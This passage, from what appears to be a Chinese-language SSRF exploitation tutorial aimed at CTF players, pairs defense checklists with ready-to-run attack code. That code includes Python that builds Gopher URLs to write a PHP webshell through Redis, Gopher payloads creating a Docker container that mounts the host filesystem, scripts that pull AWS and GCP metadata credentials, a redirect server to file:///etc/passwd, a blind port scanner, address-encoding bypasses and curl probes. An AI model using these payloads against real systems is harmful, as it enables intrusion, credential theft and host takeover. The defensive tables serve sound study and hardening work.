   └─ 否 → 进入⑤

⑤ 提交 http://[::1]/ → 响应变化？
   ├─ 是 → SSRF 确认 （IPv6 绕过）
   └─ 否 → 提交到你的 VPS 看是否有 DNS 查询
```

## 五、知识总结表

### 5.1 SSRF 防御检查清单

| 检查项 | 说明 | 常见疏漏 |
|:-------|:------|:---------|
| 协议白名单 | 只允许 http/https | 未禁用 file/gopher/dict |
| IP 黑名单 | 拒绝私网/回环/链路本地 | 未处理 IPv6/十进制/八进制 |
| DNS 二次解析 | 校验后重新解析 | 产生 DNS Rebinding 窗口 |
| 重定向校验 | 每一跳都校验 | 只检查第一跳 |
| Host 头信任 | 信任客户端 Host | Host 头 SSRF |
| 超时限制 | 设置合理超时 | 无超时导致慢速 SSRF |
| 响应类型限制 | 限制响应大小/类型 | 大文件耗尽内存 |
| 出站网络限制 | 限制服务器出站 | 裸奔到内网 |

### 5.2 内网地址绕过 10 法

| # | 写法 | 原理 |
|:-:|:-----|:-----|
| 1 | `127.1` | IPv4 简写 |
| 2 | `2130706433` | 十进制整数 |
| 3 | `0x7f000001` | 十六进制 |
| 4 | `0177.0.0.1` | 八进制 |
| 5 | `[::1]` | IPv6 回环 |
| 6 | `[::ffff:127.0.0.1]` | IPv4 映射 IPv6 |
| 7 | `127.attacker.com` | DNS 解析到内网 |
| 8 | `127%2e0%2e0%2e1` | URL 编码 |
| 9 | `127%252e0%252e0%252e1` | 双重编码 |
| 10 | `localhost.` | DNS 尾随点等价 |

### 5.3 SSRF 利用途径优先级

| 优先级 | 条件 | 利用方向 |
|:------:|:-----|:---------|
| 1 | 有回显 + HTTP 协议 | 直接探测内网服务 |
| 2 | 有回显 + file 协议可用 | 读取本地文件 |
| 3 | 有回显 + Gopher | 构造 TCP 字节流攻击 Redis/Docker |
| 4 | 无回显 + 可控 DNS | DNS 外带判断 SSRF 存在 |
| 5 | 无回显 + 可控请求 | 盲 SSRF 探测和触发副作用 |
| 6 | 重定向可用 | 绕过第一跳校验 |
| 7 | DNS 可控 | DNS Rebinding 绕过 IP 校验 |
| 8 | 云环境 | 获取云元数据（临时凭证） |

### 5.4 SSRF 绕过技术汇总表

| 绕过技术 | 核心原理 | 难度 | 防御方法 |
|:---------|:---------|:----:|:---------|
| IPv4 变体（十进制/八进制/十六进制） | 字符串黑名单只写 127.0.0.1 | 低 | 解析为 IP 后校验 |
| IPv6 回环 | 只拦截 IPv4 不拦截 IPv6 | 低 | 同时校验 IPv4 和 IPv6 |
| URL 编码 | 解码层数差异 | 中 | 解码后校验 |
| 双重编码 | 多层 URL 解码 | 中 | 逐层解码 |
| 重定向绕过 | 只校验第一跳 | 中 | 每跳都校验 |
| DNS Rebinding | 两次 DNS 返回不同 IP | 高 | 固定已校验 IP |
| 域名解析到内网 | 不解析 DNS 就校验 | 中 | 解析全部 A/AAAA |
| @ 符号绕过 | userinfo/host 解析差异 | 中 | 使用标准 URL 解析库 |
| # 片段截断 | fragment 被忽略 | 低 | 去除 fragment 后校验 |
| 尾随点 | DNS 域名规范化 | 低 | 规范化后比较 |
| Host 头注入 | 服务端拼接 Host 到 URL | 中 | 使用固定站点地址 |
| 302 协议跳转 | HTTP 302 可换协议 | 中 | 限制协议白名单 |

### 5.5 SSRF 实战速查：常见攻击目标

| 目标 | 端口 | 利用方式 | 备注 |
|:-----|:----:|:---------|:-----|
| 本机 Web | 80/8080 | 访问管理后台 | 需认证信息 |
| Redis | 6379 | Gopher + RESP 写入 webshell | Redis < 3.2.7 |
| Docker API | 2375 | HTTP/Gopher 创建容器 | 需未授权 |
| 云元数据 | 80 | HTTP GET 获取凭证 | 169.254.169.254 |
| Elasticsearch | 9200 | HTTP GET 读索引数据 | 需未授权 |
| MySQL | 3306 | 二进制协议 | 需专门工具 |
| Kubernetes | 6443 | HTTP GET API | 需认证 |
| Memcached | 11211 | Gopher 协议 | 可读写缓存数据 |

### 5.6 SSRF 防御方案实施速查

| 防御层次 | 实施方法 | 绕过难度 | 性能影响 |
|:---------|:---------|:--------:|:--------:|
| 协议白名单 | 只允许 http/https，禁用其他协议 | 高 | 低 |
| IP 白名单 | 只允许访问特定公网 IP | 极高 | 中 |
| DNS 预解析 + IP 固定 | 解析后绑定 IP，不再二次 DNS 查询 | 高 | 低 |
| 每跳重定向校验 | 跟随重定向后重新执行 IP 校验 | 高 | 中 |
| 出站防火墙 | 限制服务器出站到特定网段 | 极高 | 无 |
| 响应限制 | 限制响应大小和类型 | 中 | 低 |
| URL 规范化 | 解码 + 标准化后统一校验 | 中 | 低 |
| Host 头白名单 | 忽略客户端 Host，使用配置固定地址 | 高 | 无 |

---

 **新手避坑**：SSRF 的防御不仅在服务端代码，也在网络层。即使代码中校验了 IP，如果服务器出站没有防火墙限制，攻击者仍可通过重定向或 DNS Rebinding 绕过。

## 六、SSRF 扩展攻击技术

### 6.1 Gopher + Redis 完整利用脚本（含 RESP 协议说明）

**RESP（Redis Serialization Protocol）协议基础**

Redis 使用 RESP 协议进行通信。RESP 支持以下数据类型：

```
+OK\r\n               → 简单字符串（状态回复）
-ERR message\r\n     → 错误回复
:1\r\n               → 整数回复
$5\r\nhello\r\n      → 批量字符串
*3\r\n$3\r\nSET\r\n$5\r\nmykey\r\n$5\r\nmyval\r\n  → 数组
```

**RESP 协议格式详解（数组类型用于命令发送）：**

```
*<参数数量>\r\n
$<参数1长度>\r\n
<参数1内容>\r\n
$<参数2长度>\r\n
<参数2内容>\r\n
...
```

例如 `SET key value` 的 RESP 格式：

```
*3\r\n
$3\r\n
SET\r\n
$3\r\n
key\r\n
$5\r\n
value\r\n
```

**完整 RESP 生成器：**

```python
from urllib.parse import quote_from_bytes

def resp_command(*args):
    """
    生成 Redis RESP 协议命令字节流
    
    参数: 每个参数是字符串或字节
    返回: 完整的 RESP 协议字节序列
    """
    parts = [f"*{len(args)}\r\n".encode()]
    for arg in args:
        data = arg if isinstance(arg, bytes) else str(arg).encode()
        parts.append(f"${len(data)}\r\n".encode())
        parts.append(data)
        parts.append(b"\r\n")
    return b"".join(parts)

def gopher_url(host, port, payload_bytes):
    """
    生成 Gopher SSRF URL
    host: 目标主机
    port: 目标端口
    payload_bytes: 原始 TCP 字节流
    """
    return f"gopher://{host}:{port}/_" + quote_from_bytes(payload_bytes, safe="")

# 示例：PING 命令
ping = resp_command("PING")
print("[PING]")
print(gopher_url("127.0.0.1", "6379", ping))

# 字节流查看
print(f"\nRESP 字节流 (hex): {ping.hex()}")
print(f"RESP 文本表示: {ping.decode('ascii', errors='replace')}")
```

**完整写 Webshell 脚本：**

```python
from urllib.parse import quote_from_bytes

def resp(*args):
    """生成 RESP 命令"""
    parts = [f"*{len(args)}\r\n".encode()]
    for arg in args:
        data = arg if isinstance(arg, bytes) else str(arg).encode()
        parts.append(f"${len(data)}\r\n".encode())
        parts.append(data)
        parts.append(b"\r\n")
    return b"".join(parts)

# 构造 Webshell 内容
php_shell = b"<?php echo shell_exec($_GET['cmd'] ?? 'id'); ?>"

# 完整利用链
payload = b"".join([
    resp("CONFIG", "SET", "dir", "/var/www/html"),
    resp("CONFIG", "SET", "dbfilename", "shell.php"),
    resp("SET", "payload", php_shell),
    resp("SAVE"),
])

gopher = "gopher://127.0.0.1:6379/_" + quote_from_bytes(payload, safe="")
print(f"Gopher URL 长度: {len(gopher)}")
print(f"Gopher URL:\n{gopher}")

# 如果在 SSRF 参数中还需要外层编码
from urllib.parse import quote
full_ssrf = f"http://target/ssrf?url=" + quote(gopher, safe="")
print(f"\n完整 SSRF URL 长度: {len(full_ssrf)}")
```

**Redis 3.2.7 跨协议攻击：**

从 Redis 3.2.7 开始，Redis 引入了跨协议攻击检测。如果连接开始时收到的是 HTTP 格式的请求，Redis 会拒绝连接。这意味着通过 Gopher 发送 HTTP 请求到 Redis 端口可能被拒绝。

**解决方式**：使用 Redis 原生 RESP 协议格式，而非 HTTP 格式：

```
#  正确：使用 RESP 格式
*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$3\r\nabc\r\n

#  错误：使用 HTTP 格式（会被 3.2.7+ 拒绝）
GET / HTTP/1.1\r\n
```

### 6.2 Docker API 利用详解

**探测 Docker API 的多种方式：**

```python
import requests

def probe_docker_api(base_url):
    """探测 Docker API 是否可用"""
    
    checks = {
        "ping":      f"{base_url}/_ping",
        "version":   f"{base_url}/version",
        "info":      f"{base_url}/info",
        "containers": f"{base_url}/containers/json?all=true",
        "images":    f"{base_url}/images/json",
    }
    
    results = {}
    for name, url in checks.items():
        try:
            r = requests.get(url, timeout=3)
            results[name] = {
                "status": r.status_code,
                "body": r.text[:200] if r.text else "(empty)"
            }
        except Exception as e:
            results[name] = {"error": str(e)}
    
    return results

# 测试
result = probe_docker_api("http://127.0.0.1:2375")
for name, data in result.items():
    print(f"[{name}] {data}")
```

**Docker API 创建容器读宿主文件的完整流程：**

```python
import json
from urllib.parse import quote_from_bytes

def docker_gopher_create_container(image="alpine:latest", cmd=None, 
                                   binds=None, container_name="ssrf_reader"):
    """
    生成通过 Gopher 创建 Docker 容器的 URL
    
    Args:
        image: 容器镜像
        cmd: 要执行的命令列表
        binds: 挂载绑定列表
        container_name: 容器名称
    """
    if cmd is None:
        cmd = ["/bin/sh", "-c", "cat /host/flag"]
    if binds is None:
        binds = ["/:/host:ro"]
    
    body = json.dumps({
        "Image": image,
        "Cmd": cmd,
        "Tty": True,
        "HostConfig": {"Binds": binds}
    }, separators=(",", ":")).encode()
    
    request = (
        f"POST /containers/create?name={container_name} HTTP/1.1\r\n"
        f"Host: 127.0.0.1\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    
    return "gopher://127.0.0.1:2375/_" + quote_from_bytes(request, safe="")

def docker_gopher_start_container(container_name="ssrf_reader"):
    """生成启动容器的 Gopher URL"""
    request = (
        f"POST /containers/{container_name}/start HTTP/1.1\r\n"
        f"Host: 127.0.0.1\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    return "gopher://127.0.0.1:2375/_" + quote_from_bytes(request, safe="")

def docker_gopher_read_logs(container_name="ssrf_reader"):
    """生成读取容器日志的 Gopher URL"""
    request = (
        f"GET /containers/{container_name}/logs?stdout=1&stderr=1 HTTP/1.1\r\n"
        f"Host: 127.0.0.1\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    return "gopher://127.0.0.1:2375/_" + quote_from_bytes(request, safe="")

# 生成三个 Gopher URL
print("1. 创建容器:")
print(docker_gopher_create_container())
print("\n2. 启动容器:")
print(docker_gopher_start_container())
print("\n3. 读取日志:")
print(docker_gopher_read_logs())
```

**Docker API 不同版本路径差异：**

| Docker API 版本 | 路径前缀 | 默认启用 |
|:---------------|:---------|:--------:|
| v1.18 (Docker 1.6) | `/v1.18/` | 否 |
| v1.24 (Docker 1.12) | `/v1.24/` | 否 |
| v1.38 (Docker 18.06) | `/v1.38/` | 否 |
| v1.40 (Docker 19.03) | `/v1.40/` | 否 |
| v1.41 (Docker 20.10) | `/v1.41/` | 否 |
| 无版本 | `/_ping` | 是 |

如果不确定 API 版本，先用 `/_ping` 探测，再从 `/version` 获取版本号。

### 6.3 云元数据攻击完整指南

**各云厂商元数据端点对比：**

| 云厂商 | 端点 URL | 额外要求 | 可获取信息 |
|:-------|:---------|:---------|:-----------|
| AWS | `http://169.254.169.254/latest/meta-data/` | IMDSv2 需 Token | 临时凭证、实例 ID、AMI ID |
| GCP | `http://169.254.169.254/computeMetadata/v1/` | 头 `Metadata-Flavor: Google` | 服务账号、项目 ID |
| Azure | `http://169.254.169.254/metadata/instance` | 头 `Metadata: true` + `api-version` | VM 信息、认证令牌 |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` | 无 | 实例 ID、区域、镜像 ID |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` | 无 | 实例 ID、IP |
| 华为云 | `http://169.254.169.254/openstack/latest/` | 无 | 元数据、用户数据 |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | 无 | Droplet 信息 |
| Oracle Cloud | `http://169.254.169.254/opc/v1/instance/` | 头 `Authorization: Bearer Oracle` | 实例元数据 |

**AWS IMDSv2 完整流程：**

```
阶段1: PUT 请求获取 Token
    PUT http://169.254.169.254/latest/api/token
    Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
    → Response: AQAEAFX7...（Base64 编码的 Token）

阶段2: GET 请求使用 Token
    GET http://169.254.169.254/latest/meta-data/
    Header: X-aws-ec2-metadata-token: <Token>
    → Response: 元数据列表

阶段3: 获取临时凭证
    GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/
    Header: X-aws-ec2-metadata-token: <Token>
    → Response: {
        "AccessKeyId": "...",
        "SecretAccessKey": "...",
        "Token": "...",
        "Expiration": "..."
      }
```

**AWS IMDSv2 利用脚本：**

```python
import requests

def aws_imdsv2_exploit(ssrf_entry):
    """通过 SSRF 利用 AWS IMDSv2"""
    
    headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
    
    # Step 1: PUT 获取 Token
    token_url = f"{ssrf_entry}http://169.254.169.254/latest/api/token"
    # 注意：需要 SSRF 入口支持 PUT 方法和自定义请求头
    # 如果不能直接控制方法，可以用 Gopher 构造
    
    print("[*] Step 1: 获取 IMDSv2 Token")
    print(f"    PUT {token_url}")
    print("    Header: X-aws-ec2-metadata-token-ttl-seconds: 21600")
    
    # Step 2: 使用 Token 获取元数据
    print("\n[*] Step 2: 获取元数据")
    print(f"    GET {ssrf_entry}http://169.254.169.254/latest/meta-data/")
    print("    Header: X-aws-ec2-metadata-token: <TOKEN>")
    
    # Step 3: 获取 IAM 凭证
    print("\n[*] Step 3: 获取 IAM 凭证")
    print("    GET .../iam/security-credentials/<role-name>/")
```

**GCP 元数据攻击：**

```python
import requests

def gcp_metadata_exploit(ssrf_url):
    """通过 SSRF 获取 GCP 元数据"""
    
    headers = {"Metadata-Flavor": "Google"}
    
    # 列举服务账号
    url = ssrf_url + "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"
    r = requests.get(url, headers=headers)
    
    # 获取默认服务账号的 Token
    token_url = url + "default/token"
    r = requests.get(token_url, headers=headers)
    print(r.json())  # 包含 access_token
```

### 6.4 DNS Rebinding 完整攻击流程

**攻击原理详解：**

DNS Rebinding 是利用两次 DNS 查询返回不同 IP 来绕过 IP 校验的攻击方式。

```
正常流程：
  校验: DNS 查询 example.com → 1.2.3.4 → 允许通过
  连接: 实际连接 1.2.3.4（与校验结果一致）

DNS Rebinding 流程：
  校验: DNS 查询 rebind.attacker.com → 1.2.3.4（公网 IP）→ 允许通过
  连接: DNS 再次查询 rebind.attacker.com → 127.0.0.1（内网 IP）→ 连接内网

  或者:
  校验: DNS 查询 → TTL 短 → 缓存过期 → 连接时重新查询 → 返回不同 IP
```

**DNS Rebinding 的实现方式：**

| 方式 | 说明 | 难度 |
|:-----|:-----|:----:|
| 自建 DNS 服务器 | 控制 DNS 响应，TTL=0 交替返回不同 IP | 高 |
| rebind.it 在线服务 | 域名 `x.rebind.it` 自动实现双重响应 | 低 |
| 1u.ms 在线服务 | 类似 rebind.it 的免费服务 | 低 |
| 双 A 记录 | 一个域名同时绑定公网和内网 IP | 中 |
| 权威 DNS 切换 | DNS 服务器动态切换响应 | 高 |

**使用 rebind.it 的示例：**

```text
# 域名格式: <内网IP>-<公网IP>.rebind.it
http://127-0-0-1-52-23-45-178.rebind.it/
# 第一次解析返回 52.23.45.178（公网）
# 第二次解析返回 127.0.0.1（内网）
```

**条件检查清单：**

- [ ] 服务器在 IP 校验和实际连接之间发生了两次 DNS 查询
- [ ] DNS TTL 足够小（或实现不缓存 DNS 结果）
- [ ] 请求库没有固定已校验的 IP 到连接
- [ ] 可以对目标 IP 发出 HTTP/S 请求
- [ ] 内网目标有 HTTP 服务或可通过其他协议利用

### 6.5 SSRF 链式利用（多层跳转）

```text
SSRF 入口
  → 跳转1: 攻击者服务器 (302 -> 内网服务)
  → 跳转2: 内网 HTTP 服务（如管理后台）
  → 跳转3: 内网 API 服务
  → 最终: 获取敏感数据或触发操作
```

**多重重定向链：**

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/chain")
def chain():
    # 第一跳: 公网
    return redirect("http://192.168.1.1/admin", code=302)

@app.route("/chain2")
def chain2():
    # 协议跳转: HTTP -> file://
    return redirect("file:///etc/passwd", code=302)

app.run(host="0.0.0.0", port=8000)
```

### 6.6 SSRF + 云环境组合利用链

| 利用链 | 步骤 | 目标 |
|:-------|:-----|:-----|
| SSRF + AWS | 获取 IMDS 凭证 → 接管 S3/EC2 | 云资源接管 |
| SSRF + Docker | 创建容器挂载宿主机目录 → 读 flag | 宿主机文件读取 |
| SSRF + K8s | 访问 kubelet API → 获取 pods/tokens | 容器逃逸 |
| SSRF + Redis | 写 SSH 公钥/写 Webshell | 代码执行 |
| SSRF + Elasticsearch | 读取未授权索引数据 | 信息泄露 |
| SSRF + MinIO | 对象存储访问 | 数据泄露 |

### 6.7 盲 SSRF 与时间侧信道

```python
import time
import requests
from urllib.parse import quote

def blind_ssrf_port_scan(ssrf_entry, target_host="127.0.0.1"):
    """基于响应时间的盲 SSRF 端口扫描"""
    ports = [21, 22, 25, 80, 443, 3306, 5432, 6379, 8080, 
             9200, 11211, 2375, 6379, 27017, 10250]
    
    baseline = 0.5  # 基线响应时间（秒）
    
    for port in ports:
        # TCP 连接超时/拒绝的响应时间差异
        url = f"http://{target_host}:{port}/"
        start = time.perf_counter()
        
        try:
            r = requests.get(
                ssrf_entry + quote(url, safe=""),
                timeout=10
            )
            elapsed = time.perf_counter() - start
            if elapsed > baseline:
                # 连接耗时较长 → 可能无服务
                status = "[CLOSED]"
            else:
                status = f"[OPEN?] HTTP {r.status_code}"
        except requests.Timeout:
            elapsed = time.perf_counter() - start
            status = "[TIMEOUT] 可能防火墙拦截"
        except requests.ConnectionError:
            elapsed = time.perf_counter() - start
            status = "[ERROR]"
        except Exception as e:
            elapsed = time.perf_counter() - start
            status = f"[EXCEPTION] {e}"
        
        print(f"Port {port:5d}: {status} ({elapsed:.3f}s)")
```

### 6.8 SSRF 绕过技术综合矩阵

| 绕过技术 | 针对的防御 | 前置条件 | 成功率 |
|:---------|:-----------|:---------|:------:|
| IPv4 简写 `127.1` | 字符串匹配 127.0.0.1 | 校验器不做 IP 解析 | 高 |
| 十进制整数 `2130706433` | 字符串匹配 127.0.0.1 | 解析器支持 inet_aton | 中 |
| IPv6 `[::1]` | 只拦截 IPv4 | 网络栈支持 IPv6 | 中 |
| URL 编码 | 简单字符串过滤 | 多层解码 | 中 |
| 重定向 | 只校验第一跳 | 自动跟随重定向 | 高 |
| DNS Rebinding | 校验后二次 DNS | 两次不同结果 | 中 |
| 域名解析 | 不检查 DNS | 有可控域名 | 中 |
| `@` 符号 | 简单 host 提取 | 解析器差异 | 中 |
| `#` 片段截断 | 路径校验 | 校验器忽略 fragment | 中 |
| `\` 反斜杠 | 路径校验 | Windows 路径解释 | 低 |
| 尾随点 | 域名白名单 | DNS 规范化 | 高 |
| Host 头注入 | 服务端拼接 URL | Host 头被信任 | 中 |

### 6.9 SSRF 10 个  新手避坑

| # | 误区 | 正解 |
|:-:|:-----|:-----|
| 1 | 只拦截 localhost 就安全 | 还要拦截 IPv6/十进制/八进制/域名解析 |
| 2 | 校验后请求库不会重新解析 DNS | 可能发生 DNS Rebinding |
| 3 | 没回显就是没漏洞 | 盲 SSRF 可探测端口和触发副作用 |
| 4 | 127.0.0.1 被拦就不能访问本机 | 还有 IPv6 回环、Unix Socket 等 |
| 5 | Gopher 能打任何协议 | 不支持 TLS/UDP/随机握手 |
| 6 | file 协议必须存在 | 可能被禁用或限制 |
| 7 | Docker API 一定在 2375 | 也可能是 Unix Socket 或 TLS |
| 8 | 云元数据一定在 169.254.169.254 | 阿里云是 100.100.100.200 |
| 9 | 空响应 = 端口关闭 | 可能是协议不匹配 |
| 10 | SSRF 只能 HTTP | 还可能用 gopher/dict/file 等协议 |

### 6.10 各协议请求格式速查

| 协议 | 请求格式 | 典型端口 | 说明 |
|:-----|:---------|:--------:|:-----|
| HTTP GET | `GET /path HTTP/1.1\r\nHost: x\r\n\r\n` | 80 | 最常用 |
| HTTP POST | `POST /path HTTP/1.1\r\nHost: x\r\nContent-Type: ...\r\nContent-Length: N\r\n\r\nbody` | 80 | 需精确 Content-Length |
| Redis PING | `*1\r\n$4\r\nPING\r\n` | 6379 | RESP 协议 |
| Memcached | `stats\r\n` | 11211 | 简单文本协议 |
| SMTP | `EHLO test\r\n` | 25 | 需了解邮件事务 |
| FTP | `USER anonymous\r\nPASS test@\r\n` | 21 | 需认证交互 |

### 6.11 SSRF 快速验证 30 秒清单

```bash
# 1. 测试回环地址
curl "http://target/ssrf?url=http://127.0.0.1/"
curl "http://target/ssrf?url=http://[::1]/"
curl "http://target/ssrf?url=http://127.1/"

# 2. 测试端口扫描
curl "http://target/ssrf?url=http://127.0.0.1:6379/"
curl "http://target/ssrf?url=http://127.0.0.1:2375/_ping"
curl "http://target/ssrf?url=http://127.0.0.1:9200/"

# 3. 测试 file 协议
curl "http://target/ssrf?url=file:///etc/passwd"

# 4. 测试 dict 协议
curl "http://target/ssrf?url=dict://127.0.0.1:6379/info"

# 5. 测试重定向
curl "http://target/ssrf?url=http://YOUR_SERVER:8000/redirect"
```

### 6.12 SSRF 各攻击面利用难度速查

| 攻击面 | 前置条件 | 利用难度 | CTF 出现率 |
|:-------|:---------|:--------:|:---------:|
| 本机 Web 服务 | 127.0.0.1 可达 | 低 |  |
| 读取本地文件 | file:// 可用 | 低 |  |
| 内网端口探测 | 有回显 | 低 |  |
| 云元数据获取 | 云环境 + 169.254.169.254 可达 | 低 |  |
| 盲 SSRF 探测 | 外带通道 | 中 |  |
| Redis 写 Webshell | Gopher 可用 + Redis 未授权 | 中 |  |
| Docker API 操控 | Docker API 暴露 | 高 |  |
| DNS Rebinding | DNS 可控 | 高 |  |
| K8s API 访问 | 内网可达 + 未授权 | 高 |  |
| MySQL 注入 | 二进制协议 | 极高 |  |
| Elasticsearch 查询 | ES 未授权 | 中 |  |

---

> **一句话总结：** SSRF 的核心是让服务器代替攻击者访问受限资源。从 HTTP 内网探测到 Gopher 构造 TCP 字节流，从云元数据窃取到容器逃逸，SSRF 的利用深度取决于请求协议和回显方式。遵循"探测→确认→绕过→利用"四步法，先确认 SSRF 存在和边界，再选择最适合的利用链。

> 最后更新：2026-07
